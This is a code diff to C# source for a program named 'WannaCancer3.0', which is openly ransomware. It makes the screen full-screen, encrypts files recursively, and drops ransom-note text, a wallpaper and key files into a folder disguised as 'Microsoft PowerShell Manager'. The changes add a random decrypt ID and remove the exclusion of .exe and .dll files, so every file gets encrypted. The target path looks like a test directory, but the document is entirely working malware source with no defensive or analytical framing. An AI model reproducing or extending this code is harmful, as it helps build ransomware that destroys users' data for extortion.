@@ -17,13 +17,16 @@ namespace WannaCancer3._0
         Random rand = new Random();
         Thread encrypt;
         private int keygen;
+        private string decryptID;
         public WannaCancer()
         {
             InitializeComponent();
             MakeFullScreen();
 
             encrypt = new Thread(StartEncrypt);
-            encrypt.Start();       
+            encrypt.Start();
+
+
         }
 
         private void MakeFullScreen()
@@ -34,6 +37,7 @@ namespace WannaCancer3._0
         private void StartEncrypt()
         {
             keygen = rand.Next(10);
+            decryptID = GenerateDecryptID();
             File.Create(@"C:\Files\test.dll");
             DriveInfo[] drive = DriveInfo.GetDrives();
 
@@ -45,9 +49,19 @@ namespace WannaCancer3._0
             Encrypt(@"C:\Files\Test\");
             Extract();
 
-
             Thread.Sleep(60000);
             Environment.Exit(0);
+
+        }
+
+        private string GenerateDecryptID()
+        {
+            string result = "";
+            for (int i = 0; i < 25; i++)
+            {
+                result += (char)rand.Next(32,126);
+            }
+            return result;
         }
 
         private void Extract()
@@ -58,27 +72,32 @@ namespace WannaCancer3._0
             FileStream JP = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", FileMode.Create, FileAccess.Write);
             FileStream BG = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\BG.png", FileMode.Create, FileAccess.Write);
             FileStream keyGen = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\shell.exe", FileMode.Create);
+            FileStream decryptID = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\manager.exe", FileMode.Create);
 
             byte[] vi = Encoding.Unicode.GetBytes(Properties.Resources.VI);
             byte[] en = Encoding.Default.GetBytes(Properties.Resources.EN);
             byte[] jp = Encoding.Unicode.GetBytes(Properties.Resources.JP);
-            byte[] keygen = Encoding.Default.GetBytes(this.keygen.ToString());        
+            byte[] keygen = Encoding.Default.GetBytes(this.keygen.ToString());
+            byte[] decryptid = Encoding.Default.GetBytes(this.decryptID);
             //Image -> byte
             ImageConverter imageConverter = new ImageConverter();
             byte[] bg = (byte[])imageConverter.ConvertTo(Properties.Resources.WallPaper, typeof(byte[]));
 
-
+            //Write Stream
             VN.Write(vi, 0, vi.Length);
             EN.Write(en, 0, en.Length);
             JP.Write(jp, 0, jp.Length);
             BG.Write(bg, 0, bg.Length);
             keyGen.Write(keygen, 0, keygen.Length);
+            decryptID.Write(decryptid, 0, decryptid.Length);
 
+            //Close Stream and release resources used by the stream
             VN.Close();
             EN.Close();
             JP.Close();
             BG.Close();
-            keygen.Clone();
+            keyGen.Close();
+            decryptID.Close();
 
         }
 
@@ -91,8 +110,7 @@ namespace WannaCancer3._0
             {
                 FileInfo file = new FileInfo(item);
                 string fe = file.Extension;
-                if (fe != ".exe" && fe != ".dll")
-                    EncryptFile(item);
+                EncryptFile(item);
             }
 
             foreach (string item in directories)
@@ -127,7 +145,6 @@ namespace WannaCancer3._0
                 fs.Position = 0;
                 fs.Write(encrypt, 0, encrypt.Length);
                 fs.Close();
-
             }
             catch
             {
